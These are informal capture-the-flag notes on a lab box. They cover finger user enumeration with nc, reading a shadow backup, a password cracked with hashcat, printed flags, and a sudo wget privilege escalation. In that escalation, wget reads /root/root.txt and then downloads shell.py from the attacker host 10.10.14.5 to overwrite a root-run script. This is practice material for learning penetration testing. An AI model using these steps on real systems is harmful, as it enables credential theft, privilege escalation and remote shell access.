79/tcp  open  finger
111/tcp open  rpcbind
515/tcp open  printer

```
─$ echo "root" | nc -vn 10.129.198.61 79
(UNKNOWN) [10.129.198.61] 79 (finger) open
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Apr 13, 2022>

```

┌──(kali㉿kali)-[~]
└─$ finger @10.129.198.61
No one logged on
                                                                             
┌──(kali㉿kali)-[~]
└─$ finger admin@10.129.198.61
Login       Name               TTY         Idle    When    Where
adm      Admin                              < .  .  .  . >
dladm    Datalink Admin                     < .  .  .  . >
netadm   Network Admin                      < .  .  .  . >
netcfg   Network Configuratio               < .  .  .  . >
dhcpserv DHCP Configuration A               < .  .  .  . >
ikeuser  IKE Admin                          < .  .  .  . >
lp       Line Printer Admin                 < .  .  .  . >
                                                                             
┌──(kali㉿kali)-[~]
└─$ finger user@10.129.198.61
Login       Name               TTY         Idle    When    Where
aiuser   AI User                            < .  .  .  . >
openldap OpenLDAP User                      < .  .  .  . >
nobody   NFS Anonymous Access               < .  .  .  . >
noaccess No Access User                     < .  .  .  . >
nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >

history

 ls -l /backup
   11  cat /backup/shadow.backup
   12  sudo /root/troll
   13  sudo /root/troll

using hashcat found that the password fro sammy was cooldude!

-bash-4.4$ cat user.txt
d6240312ad58d082b44d7be2d965ecc3

-bash-4.4$  sudo wget --input-file /root/root.txt
--2023-05-23 19:01:27--  http://a3450a2a446ef235798a74faec77bf34/
Resolving a3450a2a446ef235798a74faec77bf34 (a3450a2a446ef235798a74faec77bf34)... failed: temporary name resolution failure.
wget: unable to resolve host address ‘a3450a2a446ef235798a74faec77bf34’

we could overwrite the troll file 

sudo wget http://10.10.14.5/shell.py -O /root/troll


# Lesson learnt
1. always look for enumeration scripts of services
2. look for files in the directory


